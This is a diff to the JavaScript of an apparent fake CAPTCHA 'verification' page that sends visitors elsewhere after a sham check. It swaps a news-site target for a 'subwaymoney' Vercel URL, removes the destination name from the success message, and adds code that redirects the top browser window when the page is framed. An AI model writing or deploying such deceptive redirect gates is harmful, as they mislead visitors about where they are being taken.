@@ -1,4 +1,4 @@
-const REDIRECT_URL = "https://www.angonoticias.com/";
+const REDIRECT_URL = "https://subwaymoney-coral.vercel.app/";
 const VERIFY_DELAY_MS = 1100;
 const REDIRECT_DELAY_MS = 900;
 
@@ -41,17 +41,26 @@ function startVerification() {
 
     verifyBtn.classList.add("is-done");
     verifyBtn.textContent = "Redirecionando...";
-    statusText.textContent = "Verificação concluída! Redirecionando para AngoNotícias...";
+    statusText.textContent = "Verificação concluída! Redirecionando...";
     statusText.classList.add("is-success");
+    fallbackLink.href = REDIRECT_URL;
     fallbackLink.hidden = false;
 
     setTimeout(() => {
-      window.location.href = REDIRECT_URL;
+      try {
+        if (window.top && window.top !== window.self) {
+          window.top.location.href = REDIRECT_URL;
+        } else {
+          window.location.href = REDIRECT_URL;
+        }
+      } catch {
+        window.location.href = REDIRECT_URL;
+      }
     }, REDIRECT_DELAY_MS);
   }, VERIFY_DELAY_MS);
 }
 
 sessionIdEl.textContent = generateSessionId();
 
-captchaCheck.addEventListener("click", startVerification);
+captchaBox.addEventListener("click", startVerification);
 verifyBtn.addEventListener("click", startVerification);
